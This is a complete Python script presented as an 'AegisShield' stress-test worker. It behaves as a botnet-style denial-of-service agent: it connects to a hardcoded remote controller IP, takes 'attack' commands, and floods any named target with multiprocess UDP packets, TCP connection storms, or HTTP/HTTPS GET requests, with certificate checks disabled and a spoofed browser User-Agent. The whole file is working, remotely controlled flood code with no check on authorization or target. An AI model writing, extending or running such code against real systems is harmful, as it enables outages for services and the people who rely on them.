#!/usr/bin/env python3
"""
AegisShield Stress Test Worker v2.0 (HIGH PERFORMANCE)
=======================================================
Optimized for 2Gbps+ links. Uses multiprocessing + threading for max throughput.
Usage:
    python3 worker.py --master 52.53.124.44:7777
"""

import socket
import ssl
import threading
import multiprocessing
import json
import time
import random
import argparse
import http.client
import sys
import os


class StressWorker:
    def __init__(self, master_host, master_port):
        self.master_host = master_host
        self.master_port = master_port
        self.sock = None
        self.stop_flag = threading.Event()

    def connect(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.master_host, self.master_port))
                print(f"  ✅ Connected to controller {self.master_host}:{self.master_port}")
                return
            except (ConnectionRefusedError, OSError) as e:
                print(f"  ⏳ Retrying in 3s... ({e})")
                time.sleep(3)

    def send_msg(self, msg):
        try:
            self.sock.sendall(json.dumps(msg).encode())
        except (BrokenPipeError, OSError):
            pass

    def listen(self):
        buffer = ""
        while True:
            try:
                data = self.sock.recv(4096)
                if not data:
                    raise ConnectionResetError("Disconnected")
                buffer += data.decode()
                while "\n" in buffer:
                    line, buffer = buffer.split("\n", 1)
                    if line.strip():
                        self.handle_command(json.loads(line))
            except (ConnectionResetError, BrokenPipeError, OSError) as e:
                print(f"  ❌ Lost connection: {e}")
                self.stop_flag.set()
                time.sleep(2)
                self.connect()
                buffer = ""
            except json.JSONDecodeError:
                pass

    def handle_command(self, msg):
        cmd = msg.get("cmd")
        if cmd == "stop":
            print("  🛑 Stop received")
            self.stop_flag.set()
        elif cmd == "attack":
            self.stop_flag.clear()
            threading.Thread(
                target=self.run_attack,
                args=(msg["target"], msg["port"], msg["method"],
                      msg["size"], msg["duration"]),
                daemon=True,
            ).start()

    def run_attack(self, target, port, method, size, duration):
        # Use CPU count for process scaling
        cpu_count = os.cpu_count() or 4
        print(f"  🔥 {method.upper()} → {target}:{port} | {size}B | {duration}s")
        print(f"     CPUs: {cpu_count} | Processes: {cpu_count} | Threads/proc: 16")

        if method == "udp":
            self._attack_udp_mp(target, port, size, duration, cpu_count)
        elif method == "tcp":
            self._attack_tcp_mp(target, port, size, duration, cpu_count)
        elif method == "http":
            self._attack_http(target, port, duration, use_ssl=False)
        elif method == "https":
            self._attack_http(target, port, duration, use_ssl=True)

    # ──────────────────────────────────────────────────────────────
    #  UDP FLOOD — Multiprocess + Multithread for max bandwidth
    # ──────────────────────────────────────────────────────────────
    def _attack_udp_mp(self, target, port, size, duration, num_procs):
        counter = multiprocessing.Value('q', 0)  # shared int64 counter
        stop = multiprocessing.Event()
        procs = []

        for _ in range(num_procs):
            p = multiprocessing.Process(
                target=_udp_process,
                args=(target, port, max(size, 1), duration, counter, stop),
                daemon=True
            )
            p.start()
            procs.append(p)

        start = time.time()
        try:
            while time.time() - start < duration and not self.stop_flag.is_set():
                time.sleep(2)
                elapsed = max(time.time() - start, 0.1)
                sent = counter.value
                pps = sent / elapsed
                mbps = sent * max(size, 1) * 8 / elapsed / 1_000_000
                self.send_msg({"type": "stats", "sent": sent,
                               "pps": round(pps), "mbps": round(mbps, 1),
                               "method": "UDP"})
                print(f"  📊 UDP | {sent:,} pkts | {pps:,.0f} pps | {mbps:,.1f} Mbps")
        except KeyboardInterrupt:
            pass

        stop.set()
        for p in procs:
            p.join(timeout=3)
            if p.is_alive():
                p.terminate()

        total = counter.value
        elapsed = max(time.time() - start, 0.1)
        self.send_msg({"type": "done", "total": total, "duration": elapsed})
        print(f"  ✅ UDP done. {total:,} pkts in {elapsed:.1f}s")

    # ──────────────────────────────────────────────────────────────
    #  TCP FLOOD — Multiprocess connection storm
    # ──────────────────────────────────────────────────────────────
    def _attack_tcp_mp(self, target, port, size, duration, num_procs):
        counter = multiprocessing.Value('q', 0)
        stop = multiprocessing.Event()
        procs = []

        for _ in range(num_procs):
            p = multiprocessing.Process(
                target=_tcp_process,
                args=(target, port, max(size, 1), duration, counter, stop),
                daemon=True
            )
            p.start()
            procs.append(p)

        start = time.time()
        try:
            while time.time() - start < duration and not self.stop_flag.is_set():
                time.sleep(2)
                elapsed = max(time.time() - start, 0.1)
                sent = counter.value
                cps = sent / elapsed
                self.send_msg({"type": "stats", "sent": sent,
                               "pps": round(cps), "mbps": 0,
                               "method": "TCP"})
                print(f"  📊 TCP | {sent:,} conns | {cps:,.0f} conn/s")
        except KeyboardInterrupt:
            pass

        stop.set()
        for p in procs:
            p.join(timeout=3)
            if p.is_alive():
                p.terminate()

        total = counter.value
        elapsed = max(time.time() - start, 0.1)
        self.send_msg({"type": "done", "total": total, "duration": elapsed})
        print(f"  ✅ TCP done. {total:,} conns in {elapsed:.1f}s")

    # ──────────────────────────────────────────────────────────────
    #  HTTP/HTTPS FLOOD
    # ──────────────────────────────────────────────────────────────
    def _attack_http(self, target, port, duration, use_ssl=False):
        sent = [0]
        end_time = time.time() + duration
        threads = 64  # high concurrency for HTTP
        proto = "HTTPS" if use_ssl else "HTTP"

        def worker():
            while time.time() < end_time and not self.stop_flag.is_set():
                try:
                    if use_ssl:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        conn = http.client.HTTPSConnection(target, port, timeout=5, context=ctx)
                    else:
                        conn = http.client.HTTPConnection(target, port, timeout=5)
                    conn.request("GET", "/", headers={
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                        "Accept": "*/*", "Connection": "close",
                    })
                    conn.getresponse()
                    sent[0] += 1
                    conn.close()
                except Exception:
                    sent[0] += 1

        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            thread_list.append(t)

        start = time.time()
        while time.time() < end_time and not self.stop_flag.is_set():
            time.sleep(2)
            elapsed = max(time.time() - start, 0.1)
            rps = sent[0] / elapsed
            self.send_msg({"type": "stats", "sent": sent[0],
                           "pps": round(rps), "mbps": 0, "method": proto})
            print(f"  📊 {proto} | {sent[0]:,} reqs | {rps:,.0f} req/s")

        for t in thread_list:
            t.join(timeout=2)

        elapsed = max(time.time() - start, 0.1)
        self.send_msg({"type": "done", "total": sent[0], "duration": elapsed})
        print(f"  ✅ {proto} done. {sent[0]:,} reqs in {elapsed:.1f}s")


# ══════════════════════════════════════════════════════════════════
#  Standalone process functions (run in separate processes)
# ══════════════════════════════════════════════════════════════════

def _udp_process(target, port, size, duration, counter, stop_event):
    """Each process runs 16 threads, each with its own socket."""
    payload = random.randbytes(size)
    end_time = time.time() + duration
    local_count = [0]
    BATCH = 50  # update shared counter every N packets

    def sender():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Max send buffer for throughput
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4 * 1024 * 1024)
        except Exception:
            pass
        c = 0
        while time.time() < end_time and not stop_event.is_set():
            try:
                s.sendto(payload, (target, port))
                c += 1
                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
            except OSError:
                pass
        # flush remainder
        with counter.get_lock():
            counter.value += c % BATCH
        s.close()

    threads = []
    for _ in range(16):
        t = threading.Thread(target=sender, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


def _tcp_process(target, port, size, duration, counter, stop_event):
    """Each process runs 16 threads doing TCP connections."""
    payload = random.randbytes(size)
    end_time = time.time() + duration
    BATCH = 10

    def connector():
        c = 0
        while time.time() < end_time and not stop_event.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(2)
                s.connect((target, port))
                s.sendall(payload)
                c += 1
                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
                s.close()
            except OSError:
                c += 1
                if c % BATCH == 0:
                    with counter.get_lock():
                        counter.value += BATCH
        with counter.get_lock():
            counter.value += c % BATCH

    threads = []
    for _ in range(16):
        t = threading.Thread(target=connector, daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()


BANNER = r"""
   __        __         _               ____  
   \ \      / /__  _ __| | _____ _ __  |___ \ 
    \ \ /\ / / _ \| '__| |/ / _ \ '__|   __) |
     \ V  V / (_) | |  |   <  __/ |     / __/ 
      \_/\_/ \___/|_|  |_|\_\___|_|    |_____|

  AegisShield Stress Test Worker v2.0 (HIGH PERF)
"""


def main():
    parser = argparse.ArgumentParser(description="Stress Test Worker v2")
    parser.add_argument("--master", required=True,
                        help="Controller address (e.g. 52.53.124.44:7777)")
    args = parser.parse_args()

    host, port = args.master.rsplit(":", 1)
    port = int(port)

    print(BANNER)
    cpus = os.cpu_count() or 4
    print(f"  CPUs: {cpus} | UDP: {cpus} procs × 16 threads = {cpus * 16} senders")
    print(f"  HTTP: 64 concurrent connections")
    print(f"  🎯 Connecting to controller: {host}:{port}\n")

    w = StressWorker(host, port)
    w.connect()
    w.listen()


if __name__ == "__main__":
    main()
